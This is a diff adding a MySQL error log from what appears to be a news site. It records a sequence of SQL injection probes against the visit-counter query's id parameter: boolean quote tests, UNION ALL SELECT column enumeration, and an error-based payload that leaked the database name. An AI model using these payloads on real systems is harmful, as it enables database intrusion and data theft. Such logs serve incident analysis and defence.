@@ -1,0 +1,179 @@
+Time : 20:59:40
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''0=A' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id='0=A
+
+Time : 20:59:35
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''0=A' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id='0=A
+
+Time : 20:51:41
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''A=0' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=4831'A=0
+
+Time : 15:52:05
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'chihuahuahoy'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777 and(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,unhex(Hex(cast(database() as char))),0x27,0x7e)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 15:52:00
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 15:52:00
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 15:51:59
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 15:51:58
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 15:51:58
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 15:51:57
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 15:51:57
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 15:51:56
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 15:51:56
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 15:51:55
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 15:51:55
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 15:51:54
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 15:51:53
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 15:51:53
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 15:51:52
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 15:51:52
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 15:51:51
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 15:51:51
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 15:51:50
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 15:51:49
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777 union all select null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 15:51:49
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777 union all select null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 15:51:48
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777 union all select null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 15:51:48
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777 union all select null,null,null,null,null,null,null,null,null,null--
+
+Time : 15:51:47
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777 union all select null,null,null,null,null,null,null,null,null--
+
+Time : 15:51:47
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777 union all select null,null,null,null,null,null,null,null--
+
+Time : 15:51:46
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777 union all select null,null,null,null,null,null,null--
+
+Time : 15:51:46
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777 union all select null,null,null,null,null,null--
+
+Time : 15:51:45
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777 union all select null,null,null,null,null--
+
+Time : 15:51:44
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777 union all select null,null,null,null--
+
+Time : 15:51:44
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777 union all select null,null,null--
+
+Time : 15:51:43
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777 union all select null,null--
+
+Time : 15:51:43
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777 union all select null--
+
+Time : 15:51:42
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777 union all select--
+
+Time : 15:51:21
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777'
+
+Time : 15:51:19
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" and "x"="y' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777" and "x"="y
+
+Time : 15:51:19
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" and "x"="x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777" and "x"="x
+
+Time : 15:51:18
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' and 'x'='y' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777' and 'x'='y
+
+Time : 15:51:17
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' and 'x'='x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7777' and 'x'='x
+
+Time : 11:07:19
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''0=A' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id='0=A
+
+Time : 11:07:18
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''0=A' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id='0=A
+
+Time : 11:00:54
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''A=0' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7708'A=0
